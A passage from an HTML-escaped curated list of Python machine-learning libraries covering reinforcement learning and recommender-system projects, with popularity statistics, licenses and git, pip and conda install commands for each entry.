href=&#34;https://github.com/hill-a/stable-baselines&#34;&gt;Stable Baselines&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 3.5K · 💤) - A fork of OpenAI Baselines, implementations of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/hill-a/stable-baselines&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 110 · 🔀 690 · 📋 920 - 12% open · ⏱️ 25.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/hill-a/stable-baselines&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/stable-baselines&#34;&gt;PyPi&lt;/a&gt; (📥 8.9K / month · 📦 34 · ⏱️ 06.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install stable-baselines&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rlworkgroup/garage&#34;&gt;garage&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.4K) - A toolkit for reproducible reinforcement learning research. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rlworkgroup/garage&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 78 · 🔀 260 · 📦 40 · 📋 1K - 20% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rlworkgroup/garage&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/garage&#34;&gt;PyPi&lt;/a&gt; (📥 480 / month · 📦 2 · ⏱️ 23.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install garage&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/rlax&#34;&gt;RLax&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 800) - A library of reinforcement learning building blocks in JAX. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://jax.readthedocs.io/en/latest/_static/favicon.png&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepmind/rlax&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 62 · 📦 50 · 📋 24 - 50% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepmind/rlax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/rlax&#34;&gt;PyPi&lt;/a&gt; (📥 4.2K / month · 📦 1 · ⏱️ 24.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install rlax&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/trfl&#34;&gt;TRFL&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 3.1K · 💤) - TensorFlow Reinforcement Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/deepmind/trfl&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 380 · 📦 80 · 📋 22 - 27% open · ⏱️ 16.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/deepmind/trfl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/trfl&#34;&gt;PyPi&lt;/a&gt; (📥 4.9K / month · 📦 3 · ⏱️ 16.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install trfl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pfnet/pfrl&#34;&gt;PFRL&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 850) - PFRL: a PyTorch-based deep reinforcement learning library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pfnet/pfrl&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 110 · 📦 41 · 📋 66 - 40% open · ⏱️ 14.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pfnet/pfrl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pfrl&#34;&gt;PyPi&lt;/a&gt; (📥 2.9K / month · 📦 1 · ⏱️ 07.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pfrl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/ReAgent&#34;&gt;ReAgent&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 3.2K) - A platform for Reasoning systems (Reinforcement Learning,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/ReAgent&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 440 · 📋 120 - 35% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/ReAgent&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/reagent&#34;&gt;PyPi&lt;/a&gt; (📥 9 / month · ⏱️ 27.05.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install reagent&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/IntelLabs/coach&#34;&gt;Coach&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 2.2K · 💤) - Reinforcement Learning Coach by Intel AI Lab enables easy.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/IntelLabs/coach&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 35 · 🔀 420 · 📋 270 - 32% open · ⏱️ 28.06.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/IntelLabs/coach&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/rl_coach&#34;&gt;PyPi&lt;/a&gt; (📥 160 / month · 📦 2 · ⏱️ 10.10.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install rl_coach&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/google-research/rliable&#34;&gt;rliable&lt;/a&gt;&lt;/b&gt; (🥉12 · ⭐ 420) - [NeurIPS21 Outstanding Paper] Library for reliable evaluation on RL.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/google-research/rliable&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 2 · 🔀 22 · 📦 10 · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/google-research/rliable&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/rliable%60&#34;&gt;PyPi&lt;/a&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install rliable`&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 6 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/openai/baselines&#34;&gt;baselines&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 13K · 💀) - OpenAI Baselines: high-quality implementations of reinforcement.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/keras-rl/keras-rl&#34;&gt;keras-rl&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 5.3K · 💀) - Deep Reinforcement Learning for Keras. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/chainer/chainerrl&#34;&gt;ChainerRL&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.1K · 💀) - ChainerRL is a deep reinforcement learning library built on top of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/lab&#34;&gt;DeepMind Lab&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 6.7K) - A customisable 3D platform for agent-based AI research. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2KucAZR&#34;&gt;❗️GPL-2.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SerpentAI/SerpentAI&#34;&gt;SerpentAI&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 6.3K · 💀) - Game Agent Framework. Helping you create AIs / Bots that learn to.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/enlite-ai/maze&#34;&gt;Maze&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 210) - Maze Applied Reinforcement Learning Framework. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=Custom&#34;&gt;❗️Custom&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Recommender Systems&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for building and evaluating recommendation systems.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/recommenders&#34;&gt;Recommenders&lt;/a&gt;&lt;/b&gt; (🥇34 · ⭐ 13K) - Best Practices on Recommendation Systems. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/recommenders&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 2.3K · 📥 170 · 📦 27 · 📋 690 - 19% open · ⏱️ 31.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/recommenders&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/recommenders&#34;&gt;PyPi&lt;/a&gt; (📥 110K / month · 📦 2 · ⏱️ 01.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install recommenders&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/benfred/implicit&#34;&gt;implicit&lt;/a&gt;&lt;/b&gt; (🥇30 · ⭐ 2.8K) - Fast Python Collaborative Filtering for Implicit Feedback Datasets. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/benfred/implicit&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 30 · 🔀 530 · 📦 600 · 📋 400 - 18% open · ⏱️ 17.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/benfred/implicit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/implicit&#34;&gt;PyPi&lt;/a&gt; (📥 140K / month · 📦 31 · ⏱️ 29.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install implicit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/implicit&#34;&gt;Conda&lt;/a&gt; (📥 350K · ⏱️ 29.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge implicit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lyst/lightfm&#34;&gt;lightfm&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 4K) - A Python implementation of LightFM, a hybrid recommendation algorithm. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lyst/lightfm&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 44 · 🔀 620 · 📦 730 · 📋 450 - 22% open · ⏱️ 09.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lyst/lightfm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/lightfm&#34;&gt;PyPi&lt;/a&gt; (📥 400K / month · 📦 45 · ⏱️ 27.11.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install lightfm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/lightfm&#34;&gt;Conda&lt;/a&gt; (📥 120K · ⏱️ 09.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge lightfm&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/recommenders&#34;&gt;TF Recommenders&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 1.3K) - TensorFlow Recommenders is a library for building.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/recommenders&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 33 · 🔀 190 · 📦 110 · 📋 270 - 55% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/recommenders&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-recommenders&#34;&gt;PyPi&lt;/a&gt; (📥 2.4M / month · 📦 1 · ⏱️ 23.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-recommenders&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/ranking&#34;&gt;TF Ranking&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 2.5K) - Learning to Rank in TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/ranking&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 28 · 🔀 430 · 📋 290 - 18% open · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/ranking&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow_ranking&#34;&gt;PyPi&lt;/a&gt; (📥 62K / month · 📦 11 · ⏱️ 16.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow_ranking&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/RUCAIBox/RecBole&#34;&gt;RecBole&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 1.9K) - A unified, comprehensive and efficient recommendation library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/RUCAIBox/RecBole&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 45 · 🔀 350 · 📋 400 - 14% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/RUCAIBox/RecBole&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/recbole&#34;&gt;PyPi&lt;/a&gt; (📥 2.3K / month · ⏱️ 25.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install recbole&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/aibox/recbole&#34;&gt;Conda&lt;/a&gt; (📥 1.6K · ⏱️ 25.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c aibox recbole&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PreferredAI/cornac&#34;&gt;Cornac&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 580) - A Comparative Framework for Multimodal Recommender Systems. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/PreferredAI/cornac&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 13 · 🔀 94 · 📦 110 · 📋 93 - 5% open · ⏱️ 29.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/PreferredAI/cornac&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/cornac&#34;&gt;PyPi&lt;/a&gt; (📥 120K / month · 📦 15 · ⏱️ 19.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install cornac&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/cornac&#34;&gt;Conda&lt;/a&gt; (📥 220K · ⏱️ 19.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge cornac&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/statisticianinstilettos/recmetrics&#34;&gt;recmetrics&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 390) - A library of metrics for evaluating recommender systems. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/statisticianinstilettos/recmetrics&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 85 · 📦 25 · 📋 21 - 42% open · ⏱️ 17.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/statisticianinstilettos/recmetrics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/recmetrics&#34;&gt;PyPi&lt;/a&gt; (📥 910 / month · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install recmetrics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/caserec/CaseRecommender&#34;&gt;Case Recommender&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 410) - Case Recommender: A Flexible and Extensible Python.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/caserec/CaseRecommender&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 79 · 📦 10 · 📋 27 - 25% open · ⏱️ 25.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/caserec/CaseRecommender&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/caserecommender&#34;&gt;PyPi&lt;/a&gt; (📥 180 / month · ⏱️ 25.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install caserecommender&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 7 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/NicolasHug/Surprise&#34;&gt;scikit-surprise&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 5.4K · 💀) - A Python scikit for building and analyzing recommender.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jfkirk/tensorrec&#34;&gt;tensorrec&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 1.2K · 💀) - A TensorFlow recommendation algorithm and framework in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ibayer/fastFM&#34;&gt;fastFM&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 980 · 💀) - fastFM: A Library for Factorization Machines. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lenskit/lkpy&#34;&gt;lkpy&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 200) - Python recommendation toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/maciejkula/spotlight&#34;&gt;Spotlight&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 